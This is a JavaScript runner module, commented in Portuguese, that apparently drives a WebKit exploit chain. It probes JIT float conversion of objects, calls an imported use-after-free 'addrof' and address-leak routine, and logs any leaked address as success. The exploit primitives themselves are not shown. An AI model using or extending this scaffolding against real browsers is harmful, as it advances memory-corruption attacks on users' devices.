// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para R50 - UAF)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';
import { AdvancedInt64 } from '../utils.mjs';

async function testJITBehavior() {
    logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    logS3("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);
    
    logS3(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        logS3("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        logS3("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    logS3("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// === LÓGICA DE ANÁLISE DE RESULTADOS ATUALIZADA ===
async function runUAFExploitStrategy_R50() {
    const FNAME_RUNNER = "runUAFExploitStrategy_R50"; 
    logS3(`==== INICIANDO Estratégia de Exploração UAF (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    // Esta função agora executa a cadeia UAF do arquivo testArrayBufferVictimCrash.mjs
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R50: O teste principal da UAF capturou um ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: UAF Test ERR!`;
    } else if (result && result.final_result) {
        // Analisa a nova estrutura de resultado do exploit UAF
        const uafResult = result.final_result;

        logS3(`  RUNNER R50: Módulo de exploração UAF completou.`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R50: Mensagem: ${uafResult.message}`, uafResult.success ? "vuln" : "warn", FNAME_RUNNER);

        if (uafResult.success) {
            // Se a exploração UAF foi bem-sucedida, registra o sucesso e o endereço vazado
            logS3(`  RUNNER R50: SUCESSO! Endereço vazado via UAF: ${uafResult.leaked_addr.toString(true)}`, "leak", FNAME_RUNNER);
            document.title = `${module_name_for_title}_R50: UAF SUCCESS!`;
        } else {
            // Se a exploração falhou dentro do seu próprio fluxo
            document.title = `${module_name_for_title}_R50: UAF FAIL`;
        }
    } else {
        // Caso a estrutura de resultado seja completamente inesperada
        logS3(`  RUNNER R50: Formato de resultado inválido recebido do módulo de teste.`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}_R50: Invalid Result Obj`;
    }

    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Exploração UAF (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await testJITBehavior();
    await PAUSE_S3(500);
    
    // Chama a nova função de estratégia atualizada
    await runUAFExploitStrategy_R50();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("FAIL")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R50_Done`;
    }
}
